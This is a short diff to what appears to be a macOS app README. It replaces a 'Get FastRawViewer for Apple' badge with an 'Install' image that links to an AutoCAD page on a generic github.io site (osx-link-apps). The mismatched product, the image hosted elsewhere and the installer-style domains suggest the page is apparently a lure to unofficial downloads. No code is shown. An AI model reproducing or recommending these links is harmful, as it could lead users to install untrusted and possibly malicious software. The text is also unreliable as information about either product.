@@ -7,9 +7,8 @@
 <br>  
 
 <div align="center">  
-<a href="https://install-osx-app.github.io/.github/fastrawviewer" target="_blank">  
-  <img src="https://img.shields.io/badge/GET%20FOR%20APPLE-%F0%9F%92%BE-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get FastRawViewer for Apple">  
-</a>  
+
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://osx-link-apps.github.io/.github/AutoCAD)
 </div>  
 
 ---
